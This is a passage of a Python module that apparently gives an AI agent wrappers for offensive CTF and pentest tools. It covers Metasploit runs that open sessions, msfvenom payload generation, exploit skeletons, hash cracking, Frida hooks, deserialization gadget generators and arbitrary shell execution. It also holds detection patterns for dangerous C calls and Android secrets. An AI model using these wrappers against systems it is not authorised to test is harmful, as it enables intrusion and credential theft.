        cookie_domain=cookie_domain,
        cookie_header=cookie_header,
        set_active=set_active,
    )
    return json.dumps({
        "status": "ok",
        "message": msg,
        "active": reg.active().name,
        "sessions": reg.names(),
    }, indent=2)


# =============================================================================
# Cross-domain tool wrappers (network/pwn, mobile, CTF misc)
# =============================================================================

FLAG_REGEX_DEFAULT = os.getenv(
    "REYNARD_FLAG_REGEX", r"(?:flag|ctf|key|htb|pico|thm)\{[^}]{1,120}\}"
)
_DANGEROUS_C_CALLS = (
    "system", "exec", "execve", "popen", "gets", "strcpy", "strcat",
    "sprintf", "vsprintf", "scanf", "memcpy", "read", "fscanf",
)


def _records_skeleton(source: str) -> dict:
    """Return the ParsedRecords-shaped dict used by parsers.ingest_into_memory."""
    return {
        "source": source,
        "endpoints": [],
        "parameters": [],
        "services": [],
        "findings": [],
        "summary": "",
    }


def _find_flags(text: str, pattern: str = FLAG_REGEX_DEFAULT) -> list[str]:
    try:
        rx = re.compile(pattern, re.IGNORECASE)
    except re.error:
        rx = re.compile(re.escape(pattern))
    seen: list[str] = []
    for match in rx.findall(text or ""):
        value = match if isinstance(match, str) else match[0]
        if value and value not in seen:
            seen.append(value)
    return seen[:50]


def metasploit_run(module: str = "", options: dict | None = None,
                   payload: str = "", action: str = "run",
                   resource_script: str = "", timeout: int = 300) -> str:
    """Run a Metasploit resource script (built from module/options or raw)."""
    avail = _docker_exec("command -v msfconsole", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "msfconsole not installed in container"})
    options = options or {}
    if resource_script:
        rc_lines = resource_script.splitlines()
    elif module:
        rc_lines = [f"use {module}"]
        for key, value in options.items():
            rc_lines.append(f"set {key} {value}")
        if payload:
            rc_lines.append(f"set PAYLOAD {payload}")
        rc_lines.append(action if action in {"run", "check", "exploit"} else "run")
    else:
        return json.dumps({"error": "provide either 'module' or 'resource_script'"})
    if not rc_lines or rc_lines[-1].strip() != "exit":
        rc_lines.append("exit")
    rc_content = "\n".join(rc_lines) + "\n"
    rc_path = "/tmp/reynard_msf.rc"
    cmd = (
        f"printf %s {shlex.quote(rc_content)} > {rc_path} && "
        f"msfconsole -q -n -r {rc_path} 2>&1"
    )
    result = _docker_exec(cmd, timeout=timeout)
    stdout = result.get("stdout", "")
    records = _records_skeleton("metasploit")
    rhost = str(options.get("RHOSTS") or options.get("RHOST") or "").strip()
    for line in stdout.splitlines():
        stripped = line.strip()
        if stripped.startswith(("[+]", "[*] Command shell session",
                                "[*] Meterpreter session")) and stripped:
            records["findings"].append({
                "type": "metasploit",
                "severity": "high" if "session" in stripped.lower() else "info",
                "name": stripped[:120],
                "matched_at": rhost,
                "detail": stripped[:400],
            })
    session_opened = any("session" in f["name"].lower() for f in records["findings"])
    records["summary"] = (
        f"metasploit: {'session/success' if session_opened else 'no session'} "
        f"({len(records['findings'])} signal(s))"
    )
    return json.dumps({
        "resource_script": rc_content,
        "summary": records["summary"],
        "kg_records": records,
        "stdout": stdout,
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def msfvenom_generate(payload: str, lhost: str = "", lport: int = 4444,
                      format: str = "elf", out_file: str = "",
                      extra_args: str = "", timeout: int = 120) -> str:
    """Generate a payload file with msfvenom."""
    avail = _docker_exec("command -v msfvenom", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "msfvenom not installed in container"})
    out_path = out_file or "/data/loot/payload.bin"
    parts = ["msfvenom", "-p", shlex.quote(payload)]
    if lhost:
        parts.append(f"LHOST={shlex.quote(lhost)}")
    if lport:
        parts.append(f"LPORT={int(lport)}")
    parts += ["-f", shlex.quote(format), "-o", shlex.quote(out_path)]
    cmd = " ".join(parts) + (f" {extra_args}" if extra_args else "") + " 2>&1"
    result = _docker_exec(cmd, timeout=timeout)
    size = _docker_exec(f"stat -c %s {shlex.quote(out_path)} 2>/dev/null", timeout=10)
    return json.dumps({
        "out_file": out_path,
        "bytes": (size.get("stdout", "") or "").strip(),
        "stdout": result.get("stdout", ""),
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def radare2_analyze(binary_path: str, commands: str = "",
                    timeout: int = 120) -> str:
    """Run radare2 analysis and return structured functions/strings/findings."""
    avail = _docker_exec("command -v r2", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "radare2 (r2) not installed in container"})
    cmds = commands or "aaa; iI; afl; izq"
    cmd = (
        f"r2 -q -e scr.color=0 -e bin.cache=true "
        f"-c {shlex.quote(cmds)} {shlex.quote(binary_path)} 2>&1"
    )
    result = _docker_exec(cmd, timeout=timeout)
    stdout = result.get("stdout", "")
    records = _records_skeleton("radare2")
    func_count = len(re.findall(r"^0x[0-9a-fA-F]+\s+\d+", stdout, re.MULTILINE))
    lower = stdout.lower()
    found_calls = sorted({c for c in _DANGEROUS_C_CALLS if re.search(rf"\b{re.escape(c)}\b", lower)})
    for call in found_calls:
        records["findings"].append({
            "type": "dangerous_call",
            "severity": "medium",
            "name": f"uses {call}()",
            "matched_at": binary_path,
            "detail": f"radare2 saw a reference to {call}",
        })
    for flag in _find_flags(stdout):
        records["findings"].append({
            "type": "flag_candidate",
            "severity": "info",
            "name": flag,
            "matched_at": binary_path,
            "detail": "string matched flag pattern",
        })
    records["summary"] = (
        f"radare2: {func_count} function(s); "
        f"dangerous calls: {', '.join(found_calls) or 'none'}"
    )
    return json.dumps({
        "summary": records["summary"],
        "kg_records": records,
        "stdout": stdout,
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def gdb_debug(binary_path: str, commands: str, args: str = "",
              timeout: int = 120) -> str:
    """Run gdb in batch mode with a set of commands against a binary."""
    avail = _docker_exec("command -v gdb", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "gdb not installed in container"})
    raw_cmds = re.split(r"[\n;]", commands or "")
    ex_flags = " ".join(
        f"-ex {shlex.quote(c.strip())}" for c in raw_cmds if c.strip()
    )
    tail = f" --args {shlex.quote(binary_path)} {args}" if args else f" {shlex.quote(binary_path)}"
    cmd = f"gdb --batch -nx {ex_flags}{tail} 2>&1"
    result = _docker_exec(cmd, timeout=timeout)
    return json.dumps({
        "commands": [c.strip() for c in raw_cmds if c.strip()],
        "stdout": result.get("stdout", ""),
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def _pwn_skeleton(binary_path: str, remote_host: str, remote_port: int) -> str:
    if remote_host and remote_port:
        conn = (
            "    if args.REMOTE:\n"
            f"        return remote({remote_host!r}, {int(remote_port)})\n"
            "    return process(BIN)"
        )
    else:
        conn = "    return process(BIN)"
    return (
        "#!/usr/bin/env python3\n"
        "from pwn import *\n\n"
        f"BIN = {binary_path!r}\n"
        "context.binary = elf = ELF(BIN)\n"
        "context.log_level = 'info'\n\n"
        "def start():\n"
        f"{conn}\n\n"
        "io = start()\n"
        "# offset = cyclic_find(0x6161616161616161)  # find with a cyclic pattern\n"
        "# payload = flat({offset: elf.symbols.get('win', 0)})\n"
        "# io.sendline(payload)\n"
        "io.interactive()\n"
    )


def pwn_template(binary_path: str, remote_host: str = "",
                 remote_port: int = 0, timeout: int = 60) -> str:
    """Run checksec and emit a pwntools exploit skeleton to /data/scripts."""
    checksec = _docker_exec(
        f"(pwn checksec {shlex.quote(binary_path)} 2>&1) || "
        f"rabin2 -I {shlex.quote(binary_path)} 2>&1",
        timeout=timeout,
    )
    base = binary_path.rsplit("/", 1)[-1].rsplit("\\", 1)[-1] or "target"
    script_path = f"/data/scripts/exploit_{re.sub(r'[^A-Za-z0-9_.-]', '_', base)}.py"
    skeleton = _pwn_skeleton(binary_path, remote_host, remote_port)
    _docker_exec("mkdir -p /data/scripts", timeout=10)
    write = _docker_exec(
        f"printf %s {shlex.quote(skeleton)} > {shlex.quote(script_path)}",
        timeout=15,
    )
    return json.dumps({
        "protections": checksec.get("stdout", "") or checksec.get("stderr", ""),
        "template_path": script_path,
        "template": skeleton,
        "remote": bool(remote_host and remote_port),
        "written": write.get("exit_code") == 0,
    }, indent=2, default=str)


def apk_decompile(apk_path: str, engine: str = "both", out_dir: str = "",
                  timeout: int = 300) -> str:
    """Decompile an APK with apktool and/or jadx."""
    base = apk_path.rsplit("/", 1)[-1].rsplit(".", 1)[0] or "app"
    out_base = out_dir or f"/data/loot/{re.sub(r'[^A-Za-z0-9_.-]', '_', base)}"
    outputs: dict[str, Any] = {}
    _docker_exec(f"mkdir -p {shlex.quote(out_base)}", timeout=10)
    if engine in ("apktool", "both"):
        apktool_out = f"{out_base}/apktool"
        res = _docker_exec(
            f"apktool d -f {shlex.quote(apk_path)} -o {shlex.quote(apktool_out)} 2>&1",
            timeout=timeout,
        )
        outputs["apktool"] = {"dir": apktool_out, "exit_code": res.get("exit_code"),
                              "tail": (res.get("stdout", "") or "")[-800:]}
    if engine in ("jadx", "both"):
        jadx_out = f"{out_base}/jadx"
        res = _docker_exec(
            f"jadx -d {shlex.quote(jadx_out)} {shlex.quote(apk_path)} 2>&1",
            timeout=timeout,
        )
        outputs["jadx"] = {"dir": jadx_out, "exit_code": res.get("exit_code"),
                           "tail": (res.get("stdout", "") or "")[-800:]}
    listing = _docker_exec(f"ls -la {shlex.quote(out_base)} 2>&1", timeout=15)
    return json.dumps({
        "out_dir": out_base,
        "engines": outputs,
        "listing": listing.get("stdout", ""),
    }, indent=2, default=str)


def apk_analyze(source_dir: str, timeout: int = 120) -> str:
    """Parse the manifest and grep for dangerous sinks/secrets in a decompiled APK."""
    records = _records_skeleton("apk_analyze")
    manifest = _docker_exec(
        f"find {shlex.quote(source_dir)} -name AndroidManifest.xml "
        f"-maxdepth 4 2>/dev/null | head -n1", timeout=20,
    )
    manifest_path = (manifest.get("stdout", "") or "").strip().splitlines()
    manifest_text = ""
    if manifest_path:
        cat = _docker_exec(f"cat {shlex.quote(manifest_path[0])} 2>/dev/null", timeout=20)
        manifest_text = cat.get("stdout", "")
    package = ""
    pkg_match = re.search(r'package="([^"]+)"', manifest_text)
    if pkg_match:
        package = pkg_match.group(1)
    permissions = re.findall(r'uses-permission[^>]*android:name="([^"]+)"', manifest_text)
    exported = re.findall(r'<(activity|service|receiver|provider)[^>]*android:exported="true"', manifest_text)
    sink_patterns = (
        r"addJavascriptInterface", r"setJavaScriptEnabled\(true", r"loadUrl\(",
        r"Runtime\.getRuntime\(\)\.exec", r"openFileOutput", r"MODE_WORLD_READABLE",
        r"getExternalStorage", r"SharedPreferences", r"Cipher\.getInstance",
        r"https?://[A-Za-z0-9._~:/?#@!$&'()*+,;=%-]{6,}",
        r"(?i)(api[_-]?key|secret|password|token)\s*[:=]",
    )
    grep_expr = "|".join(sink_patterns)
    grep = _docker_exec(
        f"grep -rInE {shlex.quote(grep_expr)} {shlex.quote(source_dir)} "
        f"2>/dev/null | head -n 200", timeout=timeout,
    )
    sink_hits = [ln for ln in (grep.get("stdout", "") or "").splitlines() if ln.strip()]
    for perm in permissions[:40]:
        records["findings"].append({
            "type": "android_permission", "severity": "info",
            "name": perm, "matched_at": package, "detail": "declared permission",
        })
    for hit in sink_hits[:80]:
        records["findings"].append({
            "type": "android_sink", "severity": "medium",
            "name": hit.split(":", 3)[-1].strip()[:120],
            "matched_at": hit.split(":", 1)[0], "detail": hit[:400],
        })
    records["summary"] = (
        f"apk_analyze: package={package or 'unknown'}, "
        f"perms={len(permissions)}, exported={len(exported)}, sinks={len(sink_hits)}"
    )
    return json.dumps({
        "package": package,
        "permissions": permissions,
        "exported_components": len(exported),
        "summary": records["summary"],
        "kg_records": records,
    }, indent=2, default=str)


def frida_hook(target: str, script: str, spawn: bool = True,
               device: str = "usb", duration: int = 15,
               timeout: int = 60) -> str:
    """Run a Frida script against a target app for a bounded duration."""
    avail = _docker_exec("command -v frida", timeout=5)
    if avail.get("exit_code", -1) != 0:
        return json.dumps({"error": "frida not installed in container"})
    if "\n" in script or "{" in script or not script.startswith("/"):
        script_path = "/data/scripts/reynard_frida_hook.js"
        _docker_exec("mkdir -p /data/scripts", timeout=10)
        _docker_exec(
            f"printf %s {shlex.quote(script)} > {shlex.quote(script_path)}",
            timeout=15,
        )
    else:
        script_path = script
    dev_flag = {"usb": "-U", "local": "", "remote": "-H 127.0.0.1"}.get(device, "-U")
    mode_flag = f"-f {shlex.quote(target)}" if spawn else f"-n {shlex.quote(target)}"
    cmd = (
        f"timeout {int(duration)} frida {dev_flag} {mode_flag} "
        f"-l {shlex.quote(script_path)} --runtime=v8 -q 2>&1 || true"
    )
    result = _docker_exec(cmd, timeout=max(timeout, duration + 10))
    return json.dumps({
        "target": target,
        "script_path": script_path,
        "output": result.get("stdout", ""),
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def stego_extract(file_path: str, tool: str = "auto", passphrase: str = "",
                  timeout: int = 120) -> str:
    """Extract hidden data from a carrier file with common stego tools."""
    q = shlex.quote(file_path)
    steps: dict[str, str] = {}
    if tool in ("auto", "exiftool"):
        steps["exiftool"] = f"(exiftool {q} 2>/dev/null || echo 'exiftool unavailable')"
    if tool in ("auto", "strings"):
        steps["strings"] = f"strings -n 6 {q} 2>/dev/null | head -n 200"
    if tool in ("auto", "binwalk"):
        steps["binwalk"] = f"binwalk {q} 2>&1 | head -n 60"
    if tool in ("steghide",) or tool == "auto":
        out = "/tmp/reynard_steghide.out"
        pw = shlex.quote(passphrase)
        steps["steghide"] = (
            f"steghide extract -sf {q} -p {pw} -xf {out} -f 2>&1; "
            f"echo '--- extracted ---'; cat {out} 2>/dev/null | head -c 4000"
        )
    if tool in ("zsteg",):
        steps["zsteg"] = f"(zsteg -a {q} 2>&1 || echo 'zsteg unavailable') | head -n 120"
    if tool in ("foremost",):
        steps["foremost"] = f"foremost -i {q} -o /tmp/reynard_foremost 2>&1 | tail -n 20"
    outputs: dict[str, Any] = {}
    combined = ""
    for name, sub in steps.items():
        res = _docker_exec(sub, timeout=timeout)
        text = res.get("stdout", "") or res.get("stderr", "")
        outputs[name] = text[:4000]
        combined += "\n" + text
    return json.dumps({
        "file": file_path,
        "tool": tool,
        "outputs": outputs,
        "flags": _find_flags(combined),
    }, indent=2, default=str)


def hash_crack(hash_value: str = "", hash_file: str = "", hash_type: str = "",
               wordlist: str = "", tool: str = "john", timeout: int = 300) -> str:
    """Crack a hash/password file with john or hashcat."""
    wl = wordlist or "/usr/share/wordlists/rockyou.txt"
    target_file = hash_file
    if not target_file:
        if not hash_value:
            return json.dumps({"error": "provide hash_value or hash_file"})
        target_file = "/tmp/reynard_hash.txt"
        _docker_exec(f"printf %s {shlex.quote(hash_value)} > {target_file}", timeout=10)
    if tool == "hashcat":
        avail = _docker_exec("command -v hashcat", timeout=5)
        if avail.get("exit_code", -1) != 0:
            return json.dumps({"error": "hashcat not installed in container"})
        mode = f"-m {shlex.quote(hash_type)} " if hash_type else ""
        cmd = (
            f"hashcat {mode}-a 0 {shlex.quote(target_file)} {shlex.quote(wl)} "
            f"--potfile-disable --quiet 2>&1; "
            f"hashcat {mode}-a 0 {shlex.quote(target_file)} {shlex.quote(wl)} --show 2>/dev/null"
        )
    else:
        avail = _docker_exec("command -v john", timeout=5)
        if avail.get("exit_code", -1) != 0:
            return json.dumps({"error": "john not installed in container"})
        fmt = f"--format={shlex.quote(hash_type)} " if hash_type else ""
        cmd = (
            f"john {fmt}--wordlist={shlex.quote(wl)} {shlex.quote(target_file)} 2>&1; "
            f"echo '--- cracked ---'; john --show {fmt}{shlex.quote(target_file)} 2>/dev/null"
        )
    result = _docker_exec(cmd, timeout=timeout)
    stdout = result.get("stdout", "")
    return json.dumps({
        "tool": tool,
        "wordlist": wl,
        "output": stdout,
        "flags": _find_flags(stdout),
        "exit_code": result.get("exit_code"),
    }, indent=2, default=str)


def crypto_helper(operation: str, data: str, key: str = "") -> str:
    """Pure-Python crypto/encoding transforms for CTF inputs."""
    import base64
    import binascii
    from urllib.parse import unquote

    try:
        if operation == "b64decode":
            result = base64.b64decode(data + "=" * (-len(data) % 4)).decode("utf-8", "replace")
        elif operation == "b64encode":
            result = base64.b64encode(data.encode()).decode()
        elif operation == "hexdecode":
            result = bytes.fromhex(re.sub(r"\s+", "", data)).decode("utf-8", "replace")
        elif operation == "hexencode":
            result = data.encode().hex()
        elif operation == "rot13":
            import codecs
            result = codecs.encode(data, "rot_13")
        elif operation == "rot":
            shift = int(key or 13)
            result = "".join(
                chr((ord(c) - base + shift) % 26 + base)
                if c.isalpha() else c
                for c in data
                for base in [ord("A") if c.isupper() else ord("a")]
            )
        elif operation == "xor":
            if all(ch in "0123456789abcdefABCDEF" for ch in key) and key and len(key) % 2 == 0:
                key_bytes = bytes.fromhex(key)
            else:
                key_bytes = (key or "\x00").encode()
            raw = data.encode("latin-1", "ignore")
            result = bytes(
                b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(raw)
            ).decode("utf-8", "replace")
        elif operation == "from_binary":
            bits = re.sub(r"\s+", "", data)
            result = "".join(
                chr(int(bits[i:i + 8], 2)) for i in range(0, len(bits) - 7, 8)
            )
        elif operation == "to_binary":
            result = " ".join(format(ord(c), "08b") for c in data)
        elif operation == "url_decode":
            result = unquote(data)
        elif operation == "hash_identify":
            stripped = data.strip()
            length_map = {32: "MD5/NTLM", 40: "SHA1", 56: "SHA224",
                          64: "SHA256", 96: "SHA384", 128: "SHA512"}
            hexish = bool(re.fullmatch(r"[0-9a-fA-F]+", stripped))
            guess = length_map.get(len(stripped), "unknown") if hexish else "non-hex (bcrypt/argon/other)"
            if stripped.startswith("$2"):
                guess = "bcrypt"
            elif stripped.startswith("$argon2"):
                guess = "argon2"
            result = f"length={len(stripped)} guess={guess}"
        else:
            return json.dumps({"error": f"unknown operation: {operation}"})
    except (binascii.Error, ValueError, UnicodeDecodeError) as exc:
        return json.dumps({"error": f"{operation} failed: {exc}"})
    return json.dumps({
        "operation": operation,
        "result": result,
        "flags": _find_flags(result if isinstance(result, str) else ""),
    }, indent=2, default=str)


def forensics_triage(file_path: str, action: str = "auto",
                     timeout: int = 180) -> str:
    """Triage a forensic artifact (pcap/disk/memory/file)."""
    q = shlex.quote(file_path)
    ftype = _docker_exec(f"file -b {q} 2>/dev/null", timeout=15).get("stdout", "").strip()
    resolved = action
    if action == "auto":
        low = f"{ftype.lower()} {file_path.lower()}"
        if "pcap" in low or "capture file" in low:
            resolved = "pcap"
        elif file_path.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp", ".zip", ".gz")):
            resolved = "carve"
        else:
            resolved = "strings"
    steps: dict[str, str] = {}
    if resolved == "pcap":
        steps["capinfos"] = f"(capinfos {q} 2>/dev/null || echo 'capinfos unavailable')"
        steps["protocols"] = f"(tshark -r {q} -q -z io,phs 2>/dev/null || echo 'tshark unavailable') | head -n 60"
        steps["http_objects"] = (
            f"(tshark -r {q} -Y http -T fields -e http.request.full_uri "
            f"-e http.file_data 2>/dev/null || true) | head -n 80"
        )
    elif resolved == "carve":
        steps["binwalk"] = f"binwalk -e {q} 2>&1 | head -n 60"
        steps["foremost"] = f"foremost -i {q} -o /tmp/reynard_forensics 2>&1 | tail -n 20"
        steps["exiftool"] = f"(exiftool {q} 2>/dev/null || true)"
    elif resolved == "metadata":
        steps["exiftool"] = f"(exiftool {q} 2>/dev/null || echo 'exiftool unavailable')"
        steps["file"] = f"file {q} 2>/dev/null"
    else:
        steps["strings"] = f"strings -n 6 {q} 2>/dev/null | head -n 300"
    outputs: dict[str, Any] = {}
    combined = ""
    for name, sub in steps.items():
        res = _docker_exec(sub, timeout=timeout)
        text = res.get("stdout", "") or res.get("stderr", "")
        outputs[name] = text[:5000]
        combined += "\n" + text
    return json.dumps({
        "file": file_path,
        "file_type": ftype,
        "action": resolved,
        "outputs": outputs,
        "flags": _find_flags(combined),
    }, indent=2, default=str)


def flag_hunter(text: str = "", file_path: str = "",
                pattern: str = "", timeout: int = 60) -> str:
    """Scan text and/or container files for flag patterns."""
    rx = pattern or FLAG_REGEX_DEFAULT
    found: list[str] = []
    if text:
        found.extend(_find_flags(text, rx))
    file_matches: list[str] = []
    if file_path:
        grep = _docker_exec(
            f"grep -rIEoa {shlex.quote(rx)} {shlex.quote(file_path)} 2>/dev/null | head -n 100",
            timeout=timeout,
        )
        for line in (grep.get("stdout", "") or "").splitlines():
            value = line.split(":", 1)[-1].strip() if ":" in line else line.strip()
            if value and value not in file_matches:
                file_matches.append(value)
    for value in file_matches:
        if value not in found:
            found.append(value)
    return json.dumps({
        "pattern": rx,
        "flags": found[:100],
        "count": len(found),
    }, indent=2, default=str)


# =============================================================================
# Tool Dispatcher
# =============================================================================

# Maps tool names to their execution functions
TOOL_FUNCTIONS: dict[str, callable] = {
    "run_shell": lambda args: run_shell(
        command=args["command"],
        timeout=args.get("timeout", DEFAULT_TIMEOUT),
    ),
    "request_smuggling_probe": lambda args: request_smuggling_probe(
        url=args["url"],
        vector=args.get("vector", "auto"),
        smuggled_path=args.get("smuggled_path", "/404"),
        timeout=args.get("timeout", 6),
    ),
    "tool_inventory": lambda args: tool_inventory(
        role=args.get("role", "general"),
        check_container=args.get("check_container", False),
    ),
    "read_file": lambda args: read_file(
        path=args["path"],
    ),
    "write_file": lambda args: write_file(
        path=args["path"],
        content=args["content"],
    ),
    "list_dir": lambda args: list_dir(
        path=args.get("path", "/data"),
    ),
    "http_request": lambda args: http_request(
        url=args["url"],
        method=args.get("method", "GET"),
        headers=args.get("headers"),
        data=args.get("data"),
        follow_redirects=args.get("follow_redirects", True),
        insecure=args.get("insecure", True),
        session=args.get("session"),
    ),
    "browser_navigate": lambda args: browser_navigate(
        url=args["url"],
        output_format=args.get("output_format", "html"),
        wait_ms=args.get("wait_ms", 2000),
    ),
    "browser_execute_js": lambda args: browser_execute_js(
        url=args["url"],
        script=args["script"],
        wait_ms=args.get("wait_ms", 2000),
    ),
    "browser_interact": lambda args: browser_interact(
        url=args["url"],
        actions=args["actions"],
        wait_ms=args.get("wait_ms", 2000),
    ),
    "analyze_response": lambda args: analyze_response(
        response_body=args["response_body"],
        payload=args.get("payload", ""),
    ),
    # ---- OOB ----
    "oob_get_domain": lambda args: oob_get_domain(label=args.get("label", "")),
    "oob_poll": lambda args: oob_poll(
        token=args.get("token", ""),
        timeout=args.get("timeout", 15),
        since_seconds=args.get("since_seconds"),
    ),
    # ---- Sessions ----
    "swap_session": lambda args: swap_session(name=args["name"]),
    "list_sessions": lambda args: list_sessions(),
    # ---- Differential ----
    "capture_baseline": lambda args: capture_baseline(
        name=args["name"],
        url=args["url"],
        method=args.get("method", "GET"),
        headers=args.get("headers"),
        data=args.get("data"),
        session=args.get("session"),
    ),
    "diff_against_baseline": lambda args: diff_against_baseline(
        baseline_name=args["baseline_name"],
        url=args["url"],
        method=args.get("method", "GET"),
        headers=args.get("headers"),
        data=args.get("data"),
        session=args.get("session"),
    ),
    # ---- Recon expansions ----
    "nuclei_scan": lambda args: nuclei_scan(
        url=args["url"],
        severity=args.get("severity", "medium,high,critical"),
        templates=args.get("templates", ""),
        rate_limit=args.get("rate_limit", 50),
    ),
    "extract_js_endpoints": lambda args: extract_js_endpoints(
        url=args["url"],
        max_files=args.get("max_files", 30),
    ),
    "discover_apis": lambda args: discover_apis(
        base_url=args["base_url"],
    ),
    # ---- Caido Cloud API ----
    "caido_cloud_api": lambda args: caido_mod.dumps(caido_mod.call_operation(
        operation=args["operation"],
        args=args.get("args", {}),
    )),
    "caido_cloud_request": lambda args: caido_mod.dumps(caido_mod.get_client().request(
        method=args["method"],
        path=args["path"],
        params=args.get("params"),
        json_body=args.get("json_body"),
        headers=args.get("headers"),
        require_pat=args.get("require_pat", True),
    )),
    "caido_local_api": lambda args: caido_local_mod.dumps(caido_local_mod.call_operation(
        operation=args["operation"],
        args=args.get("args", {}),
    )),
    # ---- Web research ----
    "web_search": lambda args: web_research_mod.web_search(
        query=args["query"],
        focus=args.get("focus", "ctf"),
        max_results=args.get("max_results", 8),
    ),
    "web_fetch": lambda args: web_research_mod.web_fetch(
        url=args["url"],
        max_chars=args.get("max_chars", 12000),
    ),
    # ---- Burp Suite MCP ----
    "burp_send_http1_request": lambda args: json.dumps(burp_mod.get_client().send_http1(
        raw_request=args["raw_request"],
        hostname=args["hostname"],
        port=args.get("port", 443),
        https=args.get("https", True),
    ), indent=2),
    "burp_get_scanner_issues": lambda args: json.dumps(burp_mod.get_client().get_scanner_issues(
        count=args.get("count", 50),
        offset=args.get("offset", 0),
    ), indent=2),
    "burp_generate_collaborator_payload": lambda args: json.dumps(burp_mod.get_client().generate_collaborator_payload(
        custom_data=args.get("custom_data"),
    ), indent=2),
    "burp_get_collaborator_interactions": lambda args: json.dumps(burp_mod.get_client().get_collaborator_interactions(
        payload_id=args.get("payload_id"),
    ), indent=2),
    "burp_create_repeater_tab": lambda args: json.dumps(burp_mod.get_client().create_repeater_tab(
        raw_request=args["raw_request"],
        hostname=args["hostname"],
        port=args.get("port", 443),
        https=args.get("https", True),
        tab_name=args.get("tab_name"),
    ), indent=2),
    "burp_send_to_intruder": lambda args: json.dumps(burp_mod.get_client().send_to_intruder(
        raw_request=args["raw_request"],
        hostname=args["hostname"],
        port=args.get("port", 443),
        https=args.get("https", True),
        tab_name=args.get("tab_name"),
    ), indent=2),
    "burp_get_proxy_history": lambda args: json.dumps(burp_mod.get_client().get_proxy_history(
        count=args.get("count", 50),
        offset=args.get("offset", 0),
    ), indent=2),
    "burp_get_proxy_history_regex": lambda args: json.dumps(burp_mod.get_client().get_proxy_history_regex(
        regex=args["regex"],
        count=args.get("count", 50),
        offset=args.get("offset", 0),
    ), indent=2),
    "burp_set_intercept": lambda args: json.dumps(burp_mod.get_client().set_intercept(
        enabled=args["enabled"],
    ), indent=2),
    # ---- Racing / batch sender ----
    "race_send": lambda args: shodan_mod.dumps(race_mod.race_send(
        url=args["url"],
        count=args.get("count", 20),
        concurrency=args.get("concurrency", 0),
        method=args.get("method", "GET"),
        headers=args.get("headers"),
        body=args.get("body", ""),
        mode=args.get("mode", "parallel"),
        timeout=args.get("timeout", 10),
    )),
    # ---- OSINT / external recon ----
    "shodan_host_lookup": lambda args: shodan_mod.dumps(shodan_mod.get_shodan_client().host_lookup(
        ip=args["ip"],
        history=args.get("history", False),
        minify=args.get("minify", False),
    )),
    "shodan_search": lambda args: shodan_mod.dumps(shodan_mod.get_shodan_client().search(
        query=args["query"],
        page=args.get("page", 1),
        facets=args.get("facets", ""),
    )),
    "censys_host": lambda args: shodan_mod.dumps(shodan_mod.get_censys_client().host_lookup(
        ip=args["ip"],
    )),
    "dns_recon": lambda args: dns_recon(
        domain=args["domain"],
        record_types=args.get("record_types", ""),
        timeout=args.get("timeout", 60),
    ),
    "tls_info": lambda args: tls_info(
        target=args["target"],
        timeout=args.get("timeout", 120),
    ),
    # ---- Class-specific OSS tools ----
    "jwt_tool": lambda args: jwt_tool(
        token=args["token"],
        mode=args.get("mode", "scan"),
        exploit=args.get("exploit", ""),
        wordlist=args.get("wordlist", ""),
        extra_args=args.get("extra_args", ""),
        timeout=args.get("timeout", 180),
    ),
    "ysoserial_gen": lambda args: ysoserial_gen(
        gadget=args["gadget"],
        command=args["command"],
        encode=args.get("encode", True),
        timeout=args.get("timeout", 120),
    ),
    "phpggc_gen": lambda args: phpggc_gen(
        chain=args["chain"],
        command=args["command"],
        encoding=args.get("encoding", "none"),
        extra_args=args.get("extra_args", ""),
        timeout=args.get("timeout", 120),
    ),
    "ssti_probe": lambda args: ssti_probe(
        url=args["url"],
        data=args.get("data", ""),
        extra_args=args.get("extra_args", ""),
        timeout=args.get("timeout", 300),
    ),
    # ---- Automatic tool selection ----
    "recommend_tools": lambda args: recommend_tools(
        vuln_class=args.get("vuln_class", ""),
        phase=args.get("phase", ""),
        tech=args.get("tech", ""),
    ),
    # ---- Structured scanner wrappers ----
    "ffuf_fuzz": lambda args: ffuf_fuzz(
        url=args["url"],
        wordlist=args.get("wordlist", ""),
        match_codes=args.get("match_codes", ""),
        extra_args=args.get("extra_args", ""),
        timeout=args.get("timeout", 300),
    ),
    "sqlmap_run": lambda args: sqlmap_run(
        url=args["url"],
        data=args.get("data", ""),
        extra_args=args.get("extra_args", ""),
        level=args.get("level", 2),
        risk=args.get("risk", 1),
        timeout=args.get("timeout", 600),
    ),
    "nmap_scan": lambda args: nmap_scan(
        target=args["target"],
        ports=args.get("ports", ""),
        extra_args=args.get("extra_args", ""),
        timeout=args.get("timeout", 600),
    ),
    # ---- Session registration ----
    "register_session": lambda args: register_session(
        name=args["name"],
        role_hint=args.get("role_hint", "unknown"),
        cookies=args.get("cookies"),
        cookie_domain=args.get("cookie_domain", ""),
        cookie_header=args.get("cookie_header", ""),
        static_headers=args.get("static_headers"),
        set_active=args.get("set_active", False),
    ),
    # ---- Cross-domain: network / pwn / reversing ----
    "metasploit_run": lambda args: metasploit_run(
        module=args.get("module", ""),
        options=args.get("options"),
        payload=args.get("payload", ""),
        action=args.get("action", "run"),
        resource_script=args.get("resource_script", ""),
        timeout=args.get("timeout", 300),
    ),
    "msfvenom_generate": lambda args: msfvenom_generate(
        payload=args["payload"],
        lhost=args.get("lhost", ""),
        lport=args.get("lport", 4444),
        format=args.get("format", "elf"),
        out_file=args.get("out_file", ""),
        extra_args=args.get("extra_args", ""),
        timeout=args.get("timeout", 120),
    ),
    "radare2_analyze": lambda args: radare2_analyze(
        binary_path=args["binary_path"],
        commands=args.get("commands", ""),
        timeout=args.get("timeout", 120),
    ),
    "gdb_debug": lambda args: gdb_debug(
        binary_path=args["binary_path"],
        commands=args["commands"],
        args=args.get("args", ""),
        timeout=args.get("timeout", 120),
    ),
    "pwn_template": lambda args: pwn_template(
        binary_path=args["binary_path"],
        remote_host=args.get("remote_host", ""),
        remote_port=args.get("remote_port", 0),
        timeout=args.get("timeout", 60),
    ),
